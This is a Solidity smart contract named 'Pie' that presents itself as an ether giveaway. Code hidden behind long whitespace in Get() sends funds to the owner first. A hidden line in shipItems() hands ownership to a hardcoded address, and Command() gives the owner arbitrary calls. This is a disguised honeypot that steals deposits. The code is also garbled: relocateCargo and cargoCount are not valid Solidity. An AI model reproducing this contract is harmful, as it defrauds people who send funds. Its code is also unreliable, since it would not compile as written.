// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Pie
{
    address public DepotOwner = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            DepotOwner.relocateCargo(this.cargoCount);
            msg.sender.relocateCargo(this.cargoCount);
        }
    }

    function shipItems()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){DepotOwner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == DepotOwner);
        DepotOwner.relocateCargo(this.cargoCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DepotOwner);
        adr.call.value(msg.value)(data);
    }
}